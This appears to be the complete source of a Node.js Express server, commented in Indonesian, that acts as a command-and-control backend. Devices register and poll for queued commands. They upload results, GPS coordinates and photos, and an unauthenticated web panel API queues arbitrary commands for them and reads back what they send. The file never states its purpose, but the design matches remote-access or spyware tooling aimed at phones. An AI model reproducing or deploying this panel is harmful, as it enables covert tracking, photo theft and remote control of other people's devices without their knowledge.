const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname))); // untuk file frontend

const DEVICES_FILE = path.join(__dirname, 'devices.json');
const COMMANDS_FILE = path.join(__dirname, 'commands.json');
const RESULTS_FILE = path.join(__dirname, 'results.json');

// Inisialisasi file jika belum ada
if (!fs.existsSync(DEVICES_FILE)) fs.writeFileSync(DEVICES_FILE, '{}');
if (!fs.existsSync(COMMANDS_FILE)) fs.writeFileSync(COMMANDS_FILE, '{}');
if (!fs.existsSync(RESULTS_FILE)) fs.writeFileSync(RESULTS_FILE, '{}');

// Helper baca/tulis
function readDevices() {
    return JSON.parse(fs.readFileSync(DEVICES_FILE));
}
function writeDevices(data) {
    fs.writeFileSync(DEVICES_FILE, JSON.stringify(data, null, 2));
}
function readCommands() {
    return JSON.parse(fs.readFileSync(COMMANDS_FILE));
}
function writeCommands(data) {
    fs.writeFileSync(COMMANDS_FILE, JSON.stringify(data, null, 2));
}
function readResults() {
    return JSON.parse(fs.readFileSync(RESULTS_FILE));
}
function writeResults(data) {
    fs.writeFileSync(RESULTS_FILE, JSON.stringify(data, null, 2));
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'))
});

// Endpoint: register device
app.post('/register', (req, res) => {
    const { deviceId, info } = req.body;
    let devices = readDevices();
    if (!devices[deviceId]) {
        devices[deviceId] = {
            info: info,
            lastSeen: new Date().toISOString(),
            firstSeen: new Date().toISOString()
        };
        writeDevices(devices);
    } else {
        devices[deviceId].lastSeen = new Date().toISOString();
        writeDevices(devices);
    }
    res.json({ success: true });
});

// Endpoint: polling command
app.post('/poll', (req, res) => {
    const { deviceId } = req.body;
    let devices = readDevices();
    if (devices[deviceId]) {
        devices[deviceId].lastSeen = new Date().toISOString();
        writeDevices(devices);
    }

    let commands = readCommands();
    let deviceCmds = commands[deviceId] || [];
    // Ambil command yang statusnya pending
    let pending = deviceCmds.filter(c => c.status === 'pending');
    res.json({ success: true, commands: pending.map(c => ({ id: c.id, command: c.command })) });

    // Tandai sebagai 'sent' atau hapus? Lebih baik hapus agar tidak dikirim ulang
    commands[deviceId] = deviceCmds.filter(c => c.status !== 'pending');
    writeCommands(commands);
});

// Endpoint: menerima hasil command (text, location, dll)
app.post('/result', (req, res) => {
    const { deviceId, command, result, type, lat, lon } = req.body;
    let results = readResults();
    if (!results[deviceId]) results[deviceId] = [];
    results[deviceId].push({
        timestamp: new Date().toISOString(),
        command: command,
        result: result || (type === 'location' ? `lat:${lat}, lon:${lon}` : ''),
        type: type || 'text'
    });
    writeResults(results);
    res.json({ success: true });
});

// Endpoint: upload foto
app.post('/upload', (req, res) => {
    const { deviceId, type, data } = req.body;
    if (type === 'photo') {
        const uploadDir = path.join(__dirname, 'uploads');
        if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
        const filename = `${deviceId}_${Date.now()}.jpg`;
        const filepath = path.join(uploadDir, filename);
        fs.writeFileSync(filepath, Buffer.from(data, 'base64'));

        let results = readResults();
        if (!results[deviceId]) results[deviceId] = [];
        results[deviceId].push({
            timestamp: new Date().toISOString(),
            type: 'photo',
            filename: filename
        });
        writeResults(results);
    }
    res.json({ success: true });
});

// ========== API untuk web panel ==========
app.get('/api/devices', (req, res) => {
    let devices = readDevices();
    res.json(devices);
});

app.post('/api/send_command', (req, res) => {
    const { deviceId, command } = req.body;
    let commands = readCommands();
    if (!commands[deviceId]) commands[deviceId] = [];
    commands[deviceId].push({
        id: Date.now(),
        command: command,
        status: 'pending',
        timestamp: new Date().toISOString()
    });
    writeCommands(commands);
    res.json({ success: true });
});

app.get('/api/results/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    let results = readResults();
    res.json(results[deviceId] || []);
});

app.listen(PORT, () => {
    console.log(`Server jalan di http://localhost:${PORT}`);
});
